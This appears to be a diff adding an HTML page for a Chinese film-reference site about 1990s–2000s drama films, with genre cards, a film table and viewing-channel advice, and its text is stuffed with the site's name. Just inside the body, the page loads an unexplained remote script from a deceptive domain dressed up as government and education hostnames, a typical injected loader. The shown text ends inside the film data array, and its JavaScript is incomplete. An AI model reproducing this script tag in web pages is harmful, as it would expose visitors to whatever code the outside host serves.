@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>色戒电影网 · sejiedianyingwang-zh.github.io：华语剧情电影资料库与年代片单索引</title>
+<meta name="description" content="色戒电影网（sejiedianyingwang-zh.github.io）是面向影迷的华语剧情电影资料整理站，汇集 1990—2000 年代经典华语剧情片的影片资料卡、年代时间线、题材分类与正版观看渠道指引，提供可检索可排序的年代片单表，帮助快速定位与了解影片背景。">
+<meta name="keywords" content="色戒电影网, sejiedianyingwang-zh.github.io, 华语剧情电影, 经典华语片资料, 年代片单, 李安作品, 九十年代华语电影, 剧情片索引, 正版观看渠道, 华语电影资料库">
+<meta name="author" content="色戒电影网编辑组">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#7a1f2e">
+<meta property="og:type" content="website">
+<meta property="og:title" content="色戒电影网 · 华语剧情电影资料库与年代片单索引">
+<meta property="og:description" content="汇集 1990—2000 年代经典华语剧情片的影片资料卡、年代时间线与正版观看渠道指引。">
+<meta property="og:url" content="https://sejiedianyingwang-zh.github.io">
+<meta property="og:site_name" content="色戒电影网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="色戒电影网 · 华语剧情电影资料库">
+<meta name="twitter:description" content="经典华语剧情片资料整理、年代片单与正版观看渠道指引。">
+<link rel="canonical" href="https://sejiedianyingwang-zh.github.io">
+<style>
+:root{
+  --crimson:#7a1f2e;
+  --crimson2:#a02b3f;
+  --burgundy:#5c1622;
+  --cream:#faf6f0;
+  --paper:#f4efe7;
+  --card:#fffdfa;
+  --ink:#2a1f1c;
+  --ink2:#5f524c;
+  --gold:#b08a3e;
+  --gold2:#d3b06a;
+  --line:#e6dccb;
+  --soft:#f7f1e7;
+  --shadow:0 5px 20px rgba(92,22,34,.10);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:Georgia,"Songti SC","SimSun","STSong","Times New Roman",serif;
+  background:var(--paper);color:var(--ink);line-height:1.75;font-size:16px;
+}
+a{color:var(--crimson);text-decoration:none;transition:.2s}
+a:hover{color:var(--crimson2)}
+img{max-width:100%;display:block}
+.wrap{max-width:1120px;margin:0 auto;padding:0 24px}
+/* ===== 头部 ===== */
+header{background:linear-gradient(135deg,var(--burgundy) 0%,var(--crimson) 55%,var(--crimson2) 100%);color:#f7ead8;padding:0 0 0}
+.hd-top{background:rgba(0,0,0,.22);border-bottom:1px solid rgba(240,217,181,.18);font-size:13px;padding:8px 0}
+.hd-top .wrap{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.hd-top a{color:#f0d9b5}
+.hd-top a:hover{color:#fff}
+.hd-main{padding:46px 0 52px;position:relative;overflow:hidden}
+.hd-main::before{content:"";position:absolute;right:-90px;top:-90px;width:320px;height:320px;border:1px solid rgba(240,217,181,.18);border-radius:50%}
+.hd-main::after{content:"";position:absolute;right:20px;bottom:-140px;width:240px;height:240px;border:1px solid rgba(240,217,181,.14);border-radius:50%}
+.brand{display:flex;align-items:center;gap:16px;margin-bottom:22px;position:relative;z-index:1}
+.brand .seal{width:60px;height:60px;border:2px solid var(--gold2);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:30px;color:var(--gold2);font-style:italic;background:rgba(0,0,0,.15)}
+.brand .nm{font-size:20px;letter-spacing:2px;color:#f7ead8}
+.hd-main h1{font-size:42px;line-height:1.3;font-weight:400;letter-spacing:1px;position:relative;z-index:1}
+.hd-main h1 b{font-weight:400;color:var(--gold2)}
+.hd-main .sub{font-size:16.5px;opacity:.9;margin:14px 0 20px;max-width:660px;position:relative;z-index:1}
+.hd-main .url{display:inline-block;background:rgba(0,0,0,.28);border:1px dashed rgba(240,217,181,.55);padding:9px 16px;border-radius:5px;font-family:ui-monospace,Menlo,monospace;font-size:13.5px;color:#f7ead8;position:relative;z-index:1;word-break:break-all}
+/* ===== 导航 ===== */
+nav{background:var(--card);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:40;box-shadow:0 3px 12px rgba(92,22,34,.07)}
+nav .wrap{display:flex;gap:2px;overflow-x:auto}
+nav a{padding:15px 19px;font-size:14.5px;color:var(--ink2);border-bottom:2px solid transparent;white-space:nowrap;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+nav a:hover{color:var(--crimson);background:var(--soft);text-decoration:none;border-bottom-color:var(--crimson2)}
+/* ===== 栏目通用 ===== */
+section{padding:60px 0 10px}
+.kicker{font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--gold);font-family:-apple-system,"PingFang SC",sans-serif}
+h2{font-size:27px;font-weight:400;margin:4px 0 6px;letter-spacing:.5px}
+.rule{width:56px;height:3px;background:var(--crimson);margin:14px 0 18px}
+.lead{color:var(--ink2);font-size:15.5px;max-width:840px;margin-bottom:28px}
+/* ===== 导语 ===== */
+.intro{background:var(--card);border:1px solid var(--line);border-radius:3px;padding:30px 34px;box-shadow:var(--shadow);font-size:16px;position:relative}
+.intro::before{content:"「";position:absolute;left:14px;top:8px;font-size:48px;color:var(--gold);opacity:.45;font-family:Georgia,serif}
+.intro::after{content:"」";position:absolute;right:16px;bottom:-8px;font-size:48px;color:var(--gold);opacity:.45}
+.intro p{padding:0 18px;font-style:italic;color:var(--ink)}
+/* ===== 步骤 ===== */
+.path{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line);border-radius:3px;overflow:hidden;background:var(--card);box-shadow:var(--shadow)}
+.path .p{padding:24px 22px;border-right:1px solid var(--line);position:relative}
+.path .p:last-child{border-right:none}
+.path .p .no{font-size:13px;color:var(--gold);letter-spacing:2px;font-family:-apple-system,sans-serif}
+.path .p h3{font-size:17px;margin:8px 0 8px;font-weight:400}
+.path .p p{font-size:14px;color:var(--ink2)}
+.path .p .arrow{position:absolute;right:-1px;top:50%;transform:translateY(-50%);width:0;height:0;border-left:8px solid var(--crimson);border-top:8px solid transparent;border-bottom:8px solid transparent;z-index:2}
+.path .p:last-child .arrow{display:none}
+/* ===== 搜索 ===== */
+.tools{background:var(--card);border:1px solid var(--line);border-radius:3px;padding:18px;box-shadow:var(--shadow);margin-bottom:24px;display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+.tools input{flex:1;min-width:230px;padding:11px 15px;border:1px solid var(--line);border-radius:3px;font-size:15px;font-family:inherit;outline:none;background:var(--soft)}
+.tools input:focus{border-color:var(--crimson2);box-shadow:0 0 0 3px rgba(122,31,46,.10)}
+.tools button{padding:11px 26px;background:var(--crimson);color:#f7ead8;border:none;border-radius:3px;font-size:15px;cursor:pointer;font-family:inherit;letter-spacing:1px}
+.tools button:hover{background:var(--crimson2)}
+.tools .cnt{font-size:13px;color:var(--ink2);font-family:-apple-system,sans-serif}
+/* ===== 片卡 ===== */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.film{background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);transition:.25s;display:flex;flex-direction:column}
+.film:hover{transform:translateY(-5px);box-shadow:0 14px 30px rgba(92,22,34,.16)}
+.film .ftop{background:linear-gradient(135deg,var(--crimson),var(--crimson2));padding:20px 22px;color:#f7ead8;position:relative}
+.film .ftop .yr{position:absolute;right:18px;top:16px;font-size:12px;opacity:.85;font-family:-apple-system,sans-serif}
+.film .ftop h3{font-size:19px;font-weight:400;letter-spacing:1px;padding-right:60px}
+.film .fmid{padding:18px 22px;flex:1}
+.film .fmid dl{font-size:14px}
+.film .fmid dt{color:var(--gold);font-size:12px;letter-spacing:1px;margin-top:10px;font-family:-apple-system,sans-serif}
+.film .fmid dd{color:var(--ink2)}
+.film .ftag{padding:14px 22px;border-top:1px dashed var(--line);display:flex;gap:8px;flex-wrap:wrap}
+.film .ftag span{font-size:12px;background:var(--soft);color:var(--crimson);padding:3px 10px;border-radius:2px;font-family:-apple-system,sans-serif}
+/* ===== 表 ===== */
+.tablebox{background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);overflow:hidden;border-radius:3px}
+.tablebox .cap{padding:14px 20px;background:var(--burgundy);color:#f7ead8;font-size:13px;letter-spacing:1px;font-family:-apple-system,sans-serif;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.scroll-x{overflow-x:auto;-webkit-overflow-scrolling:touch}
+table{border-collapse:collapse;width:100%;font-size:14.5px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+th,td{padding:13px 18px;text-align:left;border-bottom:1px solid var(--line)}
+th{background:var(--soft);color:var(--crimson);font-size:13px;letter-spacing:1px;cursor:pointer;user-select:none;white-space:nowrap}
+th:hover{background:var(--line)}
+th .ar{opacity:.45;margin-left:5px;font-size:10px}
+th.on{background:var(--line)}
+tbody tr:hover{background:#fbf6ee}
+tbody tr td:first-child{font-weight:600;color:var(--burgundy)}
+.num{font-variant-numeric:tabular-nums;color:var(--ink)}
+/* ===== 年代 ===== */
+.tl{position:relative;padding-left:0}
+.era{border:1px solid var(--line);border-left:5px solid var(--crimson);background:var(--card);padding:26px;margin-bottom:20px;border-radius:3px;box-shadow:var(--shadow)}
+.era .head{display:flex;align-items:baseline;gap:14px;margin-bottom:10px;flex-wrap:wrap}
+.era .year{font-size:24px;color:var(--gold);font-weight:400;font-variant-numeric:tabular-nums;letter-spacing:1px}
+.era h3{font-size:19px;font-weight:400}
+.era p{font-size:15px;color:var(--ink2)}
+.era .stats{margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);display:flex;gap:24px;flex-wrap:wrap;font-size:13px;color:var(--ink2);font-family:-apple-system,sans-serif}
+.era .stats b{color:var(--crimson)}
+/* ===== 渠道 ===== */
+.chs{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.ch{border:1px solid var(--line);background:var(--card);padding:26px;border-radius:3px;box-shadow:var(--shadow)}
+.ch .q{font-size:32px;margin-bottom:12px}
+.ch h3{font-size:18px;font-weight:400;margin-bottom:9px}
+.ch > p{font-size:14px;color:var(--ink2);margin-bottom:14px}
+.ch ul{list-style:none;font-size:14px;font-family:-apple-system,"PingFang SC",sans-serif}
+.ch li{padding:6px 0;border-top:1px dashed var(--line);color:var(--ink2)}
+.ch li b{color:var(--crimson)}
+/* ===== FAQ ===== */
+.faqs{border:1px solid var(--line);background:var(--card);box-shadow:var(--shadow);border-radius:3px;overflow:hidden}
+.faqs details{border-bottom:1px solid var(--line)}
+.faqs details:last-child{border-bottom:none}
+.faqs summary{padding:17px 22px;cursor:pointer;font-size:15.5px;list-style:none;position:relative;padding-left:54px;font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+.faqs summary::-webkit-details-marker{display:none}
+.faqs summary::before{content:"问";position:absolute;left:20px;top:50%;transform:translateY(-50%);width:22px;height:22px;line-height:22px;text-align:center;background:var(--crimson);color:#f7ead8;border-radius:50%;font-size:12px}
+.faqs summary::after{content:"＋";position:absolute;right:20px;top:50%;transform:translateY(-50%);color:var(--gold);font-size:16px}
+.faqs details[open] summary::after{content:"－"}
+.faqs details p{padding:0 22px 18px 54px;font-size:14.5px;color:var(--ink2);font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif}
+/* ===== CTA ===== */
+.note{background:linear-gradient(135deg,var(--burgundy),var(--crimson2));border-radius:3px;padding:36px 40px;color:#f7ead8;display:grid;grid-template-columns:1.4fr 1fr;gap:30px;align-items:center;box-shadow:var(--shadow)}
+.note h2{color:#fff;font-size:23px}
+.note p{font-size:15px;opacity:.92;margin-top:10px}
+.note .box{background:rgba(0,0,0,.26);border:1px dashed rgba(240,217,181,.55);padding:15px 18px;border-radius:3px;font-family:ui-monospace,Menlo,monospace;font-size:13.5px;line-height:1.9}
+.note a.more{display:inline-block;margin-top:16px;background:var(--gold);color:var(--burgundy);padding:10px 24px;font-size:14.5px;letter-spacing:1px;font-family:-apple-system,sans-serif}
+.note a.more:hover{background:var(--gold2);text-decoration:none}
+/* ===== 页脚 ===== */
+footer{background:var(--burgundy);color:#e8d5c0;margin-top:64px;padding:44px 0 22px}
+footer .wrap{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:34px}
+footer h4{color:#f0d9b5;font-size:14px;letter-spacing:2px;font-weight:400;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid rgba(240,217,181,.2);font-family:-apple-system,sans-serif}
+footer ul{list-style:none;font-family:-apple-system,"PingFang SC",sans-serif;font-size:14px}
+footer li{padding:5px 0}
+footer li a{color:#e8d5c0}
+footer li a:hover{color:#fff}
+footer .brandf h3{color:#f0d9b5;font-size:20px;letter-spacing:2px;margin-bottom:10px}
+footer .brandf p{font-size:14px;opacity:.82;max-width:300px}
+footer .copy{margin-top:30px;padding-top:16px;border-top:1px solid rgba(240,217,181,.2);font-size:12.5px;opacity:.7;text-align:center;font-family:-apple-system,sans-serif}
+/* ===== 响应式 ===== */
+@media(max-width:940px){
+  .grid,.chs{grid-template-columns:repeat(2,1fr)}
+  .path{grid-template-columns:1fr 1fr}
+  .path .p{border-right:none;border-bottom:1px solid var(--line)}
+  .path .p:nth-child(odd){border-right:1px solid var(--line)}
+  .path .p .arrow{display:none}
+  .note{grid-template-columns:1fr}
+  footer .wrap{grid-template-columns:1fr 1fr;gap:28px}
+}
+@media(max-width:640px){
+  body{font-size:15.5px}
+  .wrap{padding:0 16px}
+  .hd-top{font-size:12px}
+  .hd-main{padding:32px 0 38px}
+  .hd-main h1{font-size:28px}
+  .brand .seal{width:50px;height:50px;font-size:25px}
+  .brand .nm{font-size:17px}
+  section{padding:42px 0 8px}
+  h2{font-size:22px}
+  .intro{padding:24px 18px}
+  .intro p{padding:0}
+  .grid,.chs,.path,footer .wrap{grid-template-columns:1fr}
+  .path .p:nth-child(odd){border-right:none}
+  .film .ftop{padding:18px}
+  .film .ftop h3{font-size:17px}
+  .tools{padding:15px}
+  .tools button{padding:11px 20px}
+  th,td{padding:11px 12px;font-size:13.5px}
+  table th:nth-child(3),table td:nth-child(3),
+  table th:nth-child(4),table td:nth-child(4){display:none}
+  .note{padding:26px 20px}
+  .faqs summary{padding-left:48px;font-size:15px}
+  .faqs details p{padding-left:48px}
+  .era{padding:20px}
+  footer{padding:34px 0 20px}
+}
+@media print{
+  nav,.hd-top,.tools,.faqs summary::after{display:none}
+  section{page-break-inside:avoid}
+  body{background:#fff}
+  .film,.era,.ch,.tablebox{box-shadow:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="hd-top">
+  <div class="wrap">
+    <span>色戒电影网 · 华语剧情电影资料整理与观看指引</span>
+    <span><a href="#top">首页</a> · <a href="#index">年代片单</a> · <a href="#channels">观看渠道</a> · <a href="#about">关于本站</a></span>
+  </div>
+</div>
+
+<header class="hd-main" id="top">
+  <div class="wrap">
+    <div class="brand">
+      <div class="seal">S</div>
+      <div class="nm">色戒电影网 · SEJIE DIANYING WANG</div>
+    </div>
+    <h1>华语剧情电影资料库<br><b>从年代与题材两条线索读懂经典</b></h1>
+    <div class="sub">色戒电影网（<b>sejiedianyingwang-zh.github.io</b>）专注整理 1990—2000 年代经典华语剧情片，提供影片资料卡、年代时间线、题材分类与正版观看渠道指引。本站不提供在线播放，只做资料归档与检索辅助。</div>
+    <div class="url">https://sejiedianyingwang-zh.github.io</div>
+  </div>
+</header>
+
+<nav>
+  <div class="wrap">
+    <a href="#path">选片路径</a>
+    <a href="#genre">题材分类</a>
+    <a href="#index">年代片单</a>
+    <a href="#timeline">年代脉络</a>
+    <a href="#channels">观看渠道</a>
+    <a href="#faq">常见问题</a>
+    <a href="#about">关于本站</a>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <section id="intro">
+    <div class="intro">
+      <p>一部经典华语剧情片的价值，往往在看完之后才开始显现。色戒电影网把影片的背景、年代与题材串成一条可检索的线索，让你在海量资源里少走弯路，把时间留给真正值得反复观看的片子。</p>
+    </div>
+  </section>
+
+  <section id="path">
+    <div class="kicker">HOW TO BROWSE</div>
+    <h2>四步选片路径</h2>
+    <div class="rule"></div>
+    <p class="lead">华语剧情片数量庞大，直接搜索片名容易漏掉冷门佳作。本站把选片拆成四个动作，每完成一步，范围就缩小一层。</p>
+    <div class="path">
+      <div class="p"><div class="no">STEP 01</div><h3>定年代</h3><p>先锁定 1990 或 2000 年代，不同时期的影像质感与社会议题差异明显。</p><span class="arrow"></span></div>
+      <div class="p"><div class="no">STEP 02</div><h3>定题材</h3><p>在题材分类中选定家庭、历史或都市方向，排除明显不合口味的条目。</p><span class="arrow"></span></div>
+      <div class="p"><div class="no">STEP 03</div><h3>查资料</h3><p>打开年代片单表，按年份或片长排序，对比影片的题材与资料备注。</p><span class="arrow"></span></div>
+      <div class="p"><div class="no">STEP 04</div><h3>选版本</h3><p>优先官方修复版或正版点播，画质与字幕还原度远高于压缩资源。</p><span class="arrow"></span></div>
+    </div>
+  </section>
+
+  <section id="genre">
+    <div class="kicker">GENRES</div>
+    <h2>题材分类</h2>
+    <div class="rule"></div>
+    <p class="lead">题材是老片最稳定的检索维度。本站把收录影片归入五类，每类给出典型特征与观片提示，方便快速判断是否合口味。</p>
+    <div class="grid">
+      <article class="film">
+        <div class="ftop"><span class="yr">1990—2000s</span><h3>家庭伦理</h3></div>
+        <div class="fmid"><dl>
+          <dt>核心特征</dt><dd>以家庭成员关系为叙事主轴，重视代际冲突与情感克制。</dd>
+          <dt>观片提示</dt><dd>节奏偏慢，适合安静观看，片后讨论体验更佳。</dd>
+        </dl></div>
+        <div class="ftag"><span>亲情</span><span>代际</span><span>克制表演</span></div>
+      </article>
+      <article class="film">
+        <div class="ftop"><span class="yr">1990—2000s</span><h3>历史剧情</h3></div>
+        <div class="fmid"><dl>
+          <dt>核心特征</dt><dd>依托真实人物或时代背景，通过个体命运折射历史变迁。</dd>
+          <dt>观片提示</dt><dd>观前了解基本史实，能显著提升理解与共鸣。</dd>
+        </dl></div>
+        <div class="ftag"><span>史实</span><span>厚重</span><span>人物弧光</span></div>
+      </article>
+      <article class="film">
+        <div class="ftop"><span class="yr">1990—2000s</span><h3>文艺抒情</h3></div>
+        <div class="fmid"><dl>
+          <dt>核心特征</dt><dd>以情绪与意象驱动，影像风格鲜明，叙事留白较多。</dd>
+          <dt>观片提示</dt><dd>不必追求剧情密度，重点感受镜头语言与节奏。</dd>
+        </dl></div>
+        <div class="ftag"><span>意象</span><span>留白</span><span>情绪主导</span></div>
+      </article>
+      <article class="film">
+        <div class="ftop"><span class="yr">1990—2000s</span><h3>都市爱情</h3></div>
+        <div class="fmid"><dl>
+          <dt>核心特征</dt><dd>聚焦城市人际关系与情感抉择，对话与细节密度高。</dd>
+          <dt>观片提示</dt><dd>适合关注台词与表演细节，多次观看有新发现。</dd>
+        </dl></div>
+        <div class="ftag"><span>城市</span><span>台词</span><span>细节</span></div>
+      </article>
+      <article class="film">
+        <div class="ftop"><span class="yr">1990—2000s</span><h3>独立写实</h3></div>
+        <div class="fmid"><dl>
+          <dt>核心特征</dt><dd>以非职业演员与实景拍摄为主，贴近真实生活质感。</dd>
+          <dt>观片提示</dt><dd>方言比例高，建议开启字幕，关注日常切片。</dd>
+        </dl></div>
+        <div class="ftag"><span>方言</span><span>实景</span><span>社会切片</span></div>
+      </article>
+      <article class="film">
+        <div class="ftop"><span class="yr">1990—2000s</span><h3>年代怀旧</h3></div>
+        <div class="fmid"><dl>
+          <dt>核心特征</dt><dd>以特定年代为舞台，重现服饰、音乐与生活方式细节。</dd>
+          <dt>观片提示</dt><dd>适合关注服化道与时代氛围，兼具审美与史料价值。</dd>
+        </dl></div>
+        <div class="ftag"><span>服化道</span><span>氛围</span><span>怀旧</span></div>
+      </article>
+    </div>
+  </section>
+
+  <section id="index">
+    <div class="kicker">FILM INDEX</div>
+    <h2>年代片单</h2>
+    <div class="rule"></div>
+    <p class="lead">在下方输入框键入关键词可即时筛选片单，点击任意表头可对该列排序。片名、年代、片长与题材均为公开整理口径，具体以正式发行版本为准。</p>
+    <div class="tools">
+      <input id="q" type="search" placeholder="输入关键词，如：李安 / 家庭 / 修复版 / 1994…" aria-label="搜索片单">
+      <button type="button" onclick="doSearch()">检索</button>
+      <span class="cnt" id="cnt"></span>
+    </div>
+    <div class="tablebox">
+      <div class="cap"><span>年代片单 · 24 条精选影片条目</span><span>点击表头排序</span></div>
+      <div class="scroll-x">
+        <table id="tbl">
+          <thead>
+            <tr>
+              <th data-k="t" data-t="s">片名<span class="ar">↕</span></th>
+              <th data-k="y" data-t="n">年代<span class="ar">↕</span></th>
+              <th data-k="l" data-t="s">语系<span class="ar">↕</span></th>
+              <th data-k="g" data-t="s">题材<span class="ar">↕</span></th>
+              <th data-k="d" data-t="n">片长<span class="ar">↕</span></th>
+              <th data-k="n" data-t="s">资料备注<span class="ar">↕</span></th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section id="timeline">
+    <div class="kicker">TIMELINE</div>
+    <h2>年代脉络</h2>
+    <div class="rule"></div>
+    <p class="lead">按年代而非热度排列，更能看出华语剧情片的演变轨迹。本站选取三个代表性阶段，梳理创作倾向与观片重点。</p>
+    <div class="tl">
+      <div class="era">
+        <div class="head"><span class="year">1990—1993</span><h3>人文回归与写实起步</h3></div>
+        <p>创作者重新关注个体命运与社会现实，表演趋向自然，镜头语言贴近生活质感，是理解九十年代华语电影转向的重要起点。</p>
+        <div class="stats"><span><b>关键词</b> 纪实 · 方言 · 群像</span><span><b>观片重点</b> 社会切片与表演细节</span><span><b>代表倾向</b> 个体命运</span></div>
+      </div>
+      <div class="era">
+        <div class="head"><span class="year">1994—1997</span><h3>作者表达的高峰期</h3></div>
+        <p>家庭伦理、历史叙事与都市情感并行，多部作品在国际影展获得关注，类型边界被不断拓宽，影像风格日趋成熟。</p>
+        <div class="stats"><span><b>关键词</b> 作者 · 寓言 · 美学</span><span><b>观片重点</b> 影像风格与叙事结构</span><span><b>代表倾向</b> 跨文化表达</span></div>
+      </div>
+      <div class="era">
+        <div class="head"><span class="year">1998—2005</span><h3>多元探索与独立发声</h3></div>
+        <p>独立制片兴起，城市题材与青年视角增多，非职业演员与实景拍摄成为常见手法，影像风格更加多样。</p>
+        <div class="stats"><span><b>关键词</b> 独立 · 城市 · 方言</span><span><b>观片重点</b> 时代氛围与细节还原</span><span><b>代表倾向</b> 类型融合</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="channels">
+    <div class="kicker">LEGAL CHANNELS</div>
+    <h2>观看渠道</h2>
+    <div class="rule"></div>
+    <p class="lead">老片版权归属复杂且地区差异大。本站按渠道类型整理公开合规的观看方式，观看前请自行核实当地区域与授权状态。</p>
+    <div class="chs">
+      <div class="ch">
+        <div class="q">📀</div>
+        <h3>实体修复发行</h3>
+        <p>修复版蓝光与 DVD 画质最稳定，适合收藏与反复观看。</p>
+        <ul><li><b>优先</b> 官方修复版蓝光</li><li><b>核对</b> 发行方与字幕版本</li><li><b>注意</b> 区域码限制</li></ul>
+      </div>
+      <div class="ch">
+        <div class="q">🖥️</div>
+        <h3>正版点播平台</h3>
+        <p>主流视频平台常有经典片单专区，按片名或主演检索即可。</p>
+        <ul><li><b>先查</b> 经典片单专区</li><li><b>确认</b> 当地区域授权</li><li><b>优选</b> 带修复标识版本</li></ul>
+      </div>
+      <div class="ch">
+        <div class="q">🎞️</div>
+        <h3>展映与艺术院线</h3>
+        <p>电影节与艺术院线的修复展映，是体验大银幕质感的机会。</p>
+        <ul><li><b>关注</b> 影展修复单元</li><li><b>留意</b> 艺术院线重映</li><li><b>参与</b> 高校与资料馆放映</li></ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="faq">
+    <div class="kicker">FAQ</div>
+    <h2>常见问题</h2>
+    <div class="rule"></div>
+    <div class="faqs">
+      <details open>
+        <summary>色戒电影网的「色戒」是什么含义？</summary>
+        <p>本站名「色戒电影网」为整体站名标识，专注于华语剧情电影的公开资料整理与观看渠道指引。本站不提供任何在线播放或资源下载，网站完整名称为色戒电影网，网址为 sejiedianyingwang-zh.github.io。</p>
+      </details>
+      <details>
+        <summary>收录影片的标准是什么？</summary>
+        <p>以 1990—2000 年代华语剧情片为主，优先收录在华语电影史上具有代表性、或长期被观众讨论的经典与怀旧作品。收录以资料整理为目的，不代表本站对影片内容的评价立场。</p>
+      </details>
+      <details>
+        <summary>为什么只提供渠道指引，不提供在线观看？</summary>
+        <p>老电影版权归属复杂，固定播放源既难以长期保证有效，也可能涉及合规风险。本站只整理资料并指向公开合规渠道，由你自行核实当地区域与授权状态。</p>
+      </details>
+      <details>
+        <summary>年代片单的资料可以引用吗？</summary>
+        <p>片名、年代、片长等字段为公开整理资料，引用时建议同时核对正式发行版本。若你发现错误，可通过下方联系方式反馈，我们会标注来源并尽快修正。</p>
+      </details>
+      <details>
+        <summary>找不到想看的特定老片怎么办？</summary>
+        <p>先按年代脉络缩小时间范围，再结合题材分类交叉查找；也可在观看渠道栏目列出的正版平台内用片名或主演检索，通常比全网泛搜更高效。</p>
+      </details>
+      <details>
+        <summary>色戒电影网的网址是什么？</summary>
+        <p>本站唯一网址为 <b>https://sejiedianyingwang-zh.github.io</b>，任何使用其他域名或跳转链接的页面均与本站点无关，请留意核对。</p>
+      </details>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="kicker">ABOUT</div>
+    <h2>关于本站</h2>
+    <div class="rule"></div>
+    <div class="note">
+      <div>
+        <h2>色戒电影网是做什么的？</h2>
+        <p>由华语老片爱好者维护的资料整理站，把散落的影片资料、发行信息与观看渠道，整理成一个能快速检索、能反复翻阅的单页索引。我们不追求收录数量，更在意每一条资料的可核验性与实用性。</p>
+        <a class="more" href="#index">查看年代片单 →</a>
+      </div>
+      <div class="box">网站名称：色戒电影网<br>英文标识：sejiedianyingwang-zh<br>网站网址：<br>https://sejiedianyingwang-zh.github.io</div>
+    </div>
+  </section>
+
+</main>
+
+<footer id="contact">
+  <div class="wrap">
+    <div class="brandf">
+      <h3>色戒电影网</h3>
+      <p>华语剧情电影资料整理与观看指引站点，只提供资料与合规渠道指引，不提供在线播放或资源下载服务。</p>
+    </div>
+    <div>
+      <h4>内容栏目</h4>
+      <ul><li><a href="#path">选片路径</a></li><li><a href="#genre">题材分类</a></li><li><a href="#index">年代片单</a></li><li><a href="#timeline">年代脉络</a></li></ul>
+    </div>
+    <div>
+      <h4>观片支持</h4>
+      <ul><li><a href="#channels">观看渠道</a></li><li><a href="#faq">常见问题</a></li><li><a href="#about">关于本站</a></li><li><a href="#top">回到顶部</a></li></ul>
+    </div>
+    <div>
+      <h4>联系方式</h4>
+      <ul><li><a href="#">商务合作</a></li><li><a href="#">资料纠错</a></li><li><a href="#">投稿建议</a></li><li><a href="#">友情链接</a></li></ul>
+    </div>
+    <div class="copy">© 色戒电影网 sejiedianyingwang-zh · 本站仅作资料整理与观看渠道指引 · 网址 https://sejiedianyingwang-zh.github.io</div>
+  </div>
+</footer>
+
+<script>
+var films=[
+  {t:"大红灯笼高高挂",y:1991,l:"普通话",g:"家庭伦理",d:125,n:"仪式化影像与权力结构"},
+  {t:"霸王别姬",y:1993,l:"普通话",g:"历史剧情",d:171,n:"跨越半世纪的梨园叙事"},
+  {t:"活着",y:1994,l:"普通话",g:"历史剧情",d:133,n:"家庭命运与时代变迁"},
+  {t:"阳光灿烂的日子",y:1994,l:"普通话",g:"年代怀旧",d:134,n:"青春记忆的迷离重构"},
+  {t:"饮食男女",y:1994,l:"普通话",g:"家庭伦理",d:124,n:"餐桌上的家庭关系"},
+  {t:"爱情万岁",y:1994,l:"普通话",g:"都市爱情",d:118,n:"都市孤独的沉默书写"},
+  {t:"女人四十",y:1995,l:"粤语",g:"家庭伦理",d:101,n:"中年女性的家庭担当"},
+  {t:"少女小渔",y:1995,l:"普通话",g:"都市爱情",d:100,n:"移民境遇中的情感抉择"},
+  {t:"日光峡谷",y:1995,l:"普通话",g:"独立写实",d:93,n:"西部类型与东方叙事融合"},
+  {t:"麻将",y:1996,l:"普通话",g:"都市爱情",d:121,n:"都市人际关系的荒诞切片"},
+  {t:"河流",y:1997,l:"普通话",g:"家庭伦理",d:115,n:"父子关系的晦涩探讨"},
+  {t:"冰风暴",y:1997,l:"英语",g:"家庭伦理",d:112,n:"七十年代美国家庭伦理"},
+  {t:"一一",y:2000,l:"普通话",g:"家庭伦理",d:173,n:"一个家庭的完整生命切片"},
+  {t:"花样年华",y:2000,l:"普通话 / 粤语",g:"都市爱情",d:98,n:"六十年代香港的克制情愫"},
+  {t:"卧虎藏龙",y:2000,l:"普通话",g:"历史剧情",d:120,n:"东方美学与国际化叙事"},
+  {t:"站台",y:2000,l:"普通话",g:"独立写实",d:193,n:"县城青年的时代漂泊"},
+  {t:"蓝宇",y:2001,l:"普通话",g:"都市爱情",d:86,n:"世纪之交的情感记录"},
+  {t:"盲井",y:2003,l:"普通话",g:"独立写实",d:92,n:"底层生存的冷峻写实"},
+  {t:"二弟",y:2003,l:"普通话",g:"独立写实",d:101,n:"移民潮下的身份迷茫"},
+  {t:"世界",y:2004,l:"普通话",g:"独立写实",d:138,n:"微型景观中的世界想象"},
+  {t:"孔雀",y:2005,l:"普通话",g:"年代怀旧",d:131,n:"平凡家庭三代人的梦想"},
+  {t:"最好的时光",y:2005,l:"普通话",g:"文艺抒情",d:117,n:"三段时空的情感变奏"},
+  {t:"色，戒",y:2007,l:"普通话 / 上海话",g:"历史剧情",d:158,n:"战时背景下的情感博弈"},
+  {t:"天水围的日与夜",y:2008,l:"粤语",g:"家庭伦理",d:90,n:"市井日常的生活诗"}
+];
